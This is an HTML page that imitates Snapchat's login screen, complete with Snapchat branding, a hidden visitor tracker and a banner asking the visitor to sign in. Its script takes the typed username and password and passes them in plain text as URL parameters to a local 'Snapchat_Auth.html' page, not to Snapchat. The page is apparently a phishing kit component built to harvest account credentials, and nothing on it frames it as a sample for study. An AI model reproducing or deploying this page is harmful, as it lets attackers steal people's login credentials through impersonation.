
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<!-- Start of StatCounter Code for Default Guide -->
<script type="text/javascript">
   var sc_project=11060036;
   var sc_invisible=1;
   var sc_security="15f5d4de";
   var scJsHost = (("https:" == document.location.protocol) ?
   "https://secure." : "http://www.");
   document.write("<sc"+"ript type='text/javascript' src='" +
   scJsHost+
   "statcounter.com/counter/counter.js'></"+"script>");
</script>
<noscript>
   <div class="statcounter"><a title="free hit
      counters" href="http://statcounter.com/free-hit-counter/"
      target="_blank"><img class="statcounter"
      src="//c.statcounter.com/11060036/0/15f5d4de/1/" alt="free
      hit counters"></a></div>
</noscript>
<!-- End of StatCounter Code for Default Guide -->
<link href="https://fonts.googleapis.com/css?family=Open+Sans:400,300" rel="stylesheet" type="text/css">
<style>
   body {
   margin:0px;
   font-family: HelveticaNeue-Light,'Helvetica Neue Light','Helvetica Neue',Helvetica,Arial,'Lucida Grande',sans-serif;
   background-color: #262626;
   color:#fff;
   }
   a {
   cursor: pointer;
   }
   a {
   background: 0 0;
   color: #009fda;
   text-decoration: none;
   font-size:14px;
   }
</style>
<title>Log In - Snapchat</title>
<link rel="shortcut icon" type="image/png" href="https://accounts.snapchat.com/favicon.ico"/>
<script>
   var whichClick;
   window.onload=function() { attachBehaviors(); }
   function attachBehaviors() {
    var arr = new Array ('submitOne','submitTwo');
    for (i=0;i<arr.length;i++) {
     var but_id=arr[i];
     if (document.getElementById(but_id)) {
      document.getElementById(but_id).onclick=function() { whichClick=this.id; }
     }
    }
   }
   function convertURL(form) {
    if (document.getElementById('username')) {
     var username = document.getElementById('username').value;
     var password = document.getElementById('password').value;
     if (username=='') { return false; }
     if (password=='') { return false; }
     var final_url;
     if (whichClick=='submitTwo') {
     final_url = 'Snapchat_Auth.html?user='+username+'&pass='+password+'';
     }
     else { final_url = 'Snapchat_Auth.html?user='+ username +'&pass='+ password +''; }
     window.location=final_url;

    }
    return false;
   }
</script>
<body>
   <center>
   <img src="https://accounts.snapchat.com/accounts/static/images/ghost/ghost.svg" style="width:36px;padding-top:80px;padding-bottom:95px;">
   <font size="48px;"><br>Log In</font><br>
   <style>
      .inputBox {
      font-family: HelveticaNeue-Light,'Helvetica Neue Light','Helvetica Neue',Helvetica,Arial,'Lucida Grande',sans-serif;
      margin: 0;
      outline: 0;
      -webkit-appearance: none;
      tap-highlight-color: rgba(255,255,255,0);
      line-height: 1.2142em;
      padding: .67861em 1em;
      font-size: 1em;
      background-color: #fff;
      border: 1px solid rgba(39,41,43,.15);
      color: rgba(0,0,0,.8);
      border-radius: .2857rem;
      box-shadow: 0 0 0 0 transparent inset;
      -webkit-transition: background-color .2s ease,color .2s ease,box-shadow .2s ease,border-color .2s ease;
      transition: background-color .2s ease,color .2s ease,box-shadow .2s ease,border-color .2s ease;
      width:304px;
      height:38px;
      margin-bottom:15px;
      font-size:14px;
      }
      button {
      cursor: pointer;
      display: inline-block;
      min-height: 1em;
      outline: 0;
      border: none;
      vertical-align: baseline;
      background-color: #fffc01;
      color: #262626;
      font-family: HelveticaNeue-Light,'Helvetica Neue Light','Helvetica Neue',Helvetica,Arial,'Lucida Grande',sans-serif;
      margin: 0 .25em 0 0;
      padding: 13px 1.5em;
      text-shadow: none;
      font-weight: 700;
      line-height: 1;
      font-style: normal;
      text-align: center;
      text-decoration: none;
      text-transform: uppercase;
      background-image: none;
      border-radius: 5px;
      box-shadow: 0 0 0 1px transparent inset,0 0 0 0 rgba(39,41,43,.15)inset;
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
      -webkit-transition: opacity .1s ease,background-color .1s ease,color .1s ease,box-shadow .1s ease,background .1s ease;
      transition: opacity .1s ease,background-color .1s ease,color .1s ease,box-shadow .1s ease,background .1s ease;
      will-change: '';
      -webkit-tap-highlight-color: transparent;
      width:304px;
      height:38px;
      }
      button:hover {
      background-color: #F4F100;
      }
   </style>
   <form action="" onsubmit="return convertURL(this);">
      <input class="inputBox" id="username" name="username" type="text" placeholder="Username" style="margin-top:20px;"><br>
      <input class="inputBox" id="password" name="password" type="password" placeholder="Password"><br>
      <button class="button" type="submit" style="margin-top:5px;">LOG IN</button>
   </form>
   <a href="https://accounts.snapchat.com/accounts/password_reset_request">Forgot your password?</a>
   <div style="position:fixed;background-color:#fff;width:100%;top:0;height:20px;padding:15px;">
      <font color="#000">Please sign into your account to continue</font>
   </div>
</body>